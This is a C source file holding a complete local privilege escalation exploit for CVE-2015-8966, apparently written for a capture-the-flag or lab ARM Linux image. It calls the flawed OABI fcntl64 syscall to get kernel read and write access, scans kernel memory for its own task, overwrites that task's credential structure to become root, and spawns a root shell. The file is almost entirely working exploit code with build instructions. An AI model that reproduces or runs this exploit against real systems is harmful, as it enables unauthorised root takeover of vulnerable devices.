/* Exploit for CVE-2015-8966
 * Compile with `arm-linux-gnueabi-gcc -static sploit.c -o sploit`
 * Pack rootfs.img up with `find . | cpio -H newc -o  | gzip -9 > rootfs.img`
 */

#include <errno.h>
#include <fcntl.h>
#include <linux/fs.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>

#define _GNU_SOURCE
#define F_OFD_GETLK   36
#define F_OFD_SETLK   37
#define F_OFD_SETLKW  38
#define KNRM  "\x1B[0m"
#define KRED  "\x1B[31m"
#define KGRN  "\x1B[32m"

char prog_name[7];
const unsigned int start = 0xc0000000;
const unsigned int end  =  0xc8000000;
unsigned int chunk_size = 1000000;
unsigned int cur;
struct flock *map_base;
int chunk_num = 0;
int found = 0;

__attribute__((naked)) long sys_oabi_fcntl64(unsigned int fd, unsigned int cmd, unsigned long arg){
    __asm __volatile (
        "swi    0x9000DD\n"
        "mov    pc, lr\n"
    );
}

void kernel_read(int kernel_addr, size_t len, char *out) {
    if(!fork()) {
        int fd = open("/home/user/tmpread", O_WRONLY | O_CREAT, 0644);
        sys_oabi_fcntl64(fd, F_OFD_GETLK, (long)map_base);
        write(fd, kernel_addr, len);
        close(fd);
        exit(0);
    }
    wait(NULL);
    int fd = open("/home/user/tmpread", O_RDONLY);
    if(fd == -1) {
        printf("[!!] Failed to open tmpread file\n");
        exit(0);
    }
    int num_read = read(fd, out, len);
    return num_read;
}

void write_kmem_to_file() {
    int fd = open("/home/user/mem", O_RDWR | O_CREAT, 0644); 
    lseek(fd, 0, SEEK_SET);
    int num_written = write(fd, cur, chunk_size);
    if(num_written != chunk_size) {
        printf("[!!] Didn't write enough :(: %d\n", num_written);
    }

    close(fd);
}

void set_fs_and_write(int fd) {
    if(!fork()) {
        sys_oabi_fcntl64(fd, F_OFD_GETLK, (long)map_base);
        write_kmem_to_file();
        exit(0);
    }
    wait(NULL);
    cur += chunk_size;
}

int get_creds_ptr(int mid_task_ptr) { 
    int ptr = 0;
    kernel_read(mid_task_ptr-4, 4, &ptr);
    printf("[*] cred struct: %p\n", ptr);
    return ptr;
}

void overwrite_creds(int fd, unsigned int creds) {
    if(!fork()) {
        sys_oabi_fcntl64(fd, F_OFD_GETLK, (long)map_base);

        int ret;
        int fds[2];
        pipe(fds);
        int out = fds[0];
        int in = fds[1];

        write(in, 0xc00000b0, 32); // Address of some null bytes
        read(out, creds+4, 32);
        
        exit(0);
    }
    wait(NULL);
}

int scan_kmem_for_task() {
    int fd = open("/home/user/mem", O_RDONLY);
    int num_read = 0;
    char buf[chunk_size];
    int val = 0;
    int idx = 0;
    int name_len = strlen(prog_name);

    num_read = read(fd, buf, chunk_size);

    if(num_read != chunk_size) {
        printf("[*] Didn't read enough in scan_kmem :(: %d\n", num_read);
    }

    int f = memmem(buf, chunk_size, prog_name, name_len);
    if(f) {
        int offset = f - (int)buf;
        unsigned int s = start + ((chunk_num * chunk_size) + offset);
        printf("[*] Found program name at: %p\n", s);
        int c = get_creds_ptr(s);
        if(c > 0xc0000000) {
            printf("%s[*] Overwriting cred struct at %p%s\n", KGRN, c, KNRM);
            overwrite_creds(fd, c);
            found = 1;
        }
        else {
            printf("%s[*] Found bad cred ptr, skipping overwrite%s\n", KRED, KNRM);
        }
    }

    close(fd);
}

int main(int argc, char const *argv[]){
    int fd = open("/proc/cpuinfo", O_RDONLY);
    map_base = (struct flock *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if(map_base == (void*)-1){
        perror("mmap");
        return 0;
    }
    memset(map_base, 0, 0x1000);
    map_base->l_start = SEEK_SET;
    map_base->l_len = 10;

    strcpy(prog_name, "\x4f\x57\x4e\x50\x57\x4e");
    prog_name[0] ^= 31;
    printf("[*] Setting program name: %s\n", prog_name);
    prctl(PR_SET_NAME, prog_name, 0, 0, 0);

    cur = start;
    printf("[*] Starting kmem scan...\n");
    while(!found && cur < end - chunk_size) {
        set_fs_and_write(fd);
        scan_kmem_for_task();
        ++chunk_num;
    }
    wait(NULL);
   

    if(!getuid()){
        printf("[+] Success. Spawning shell...\n");
        char *args[2];
        args[0] = "/bin/sh";
        args[1] = NULL;
        execve(args[0], args, NULL);
    }
    else {
        printf("[-] Failed :(\n");
    }
    
    munmap(map_base, 0x1000);
    close(fd);
    return 0;
}
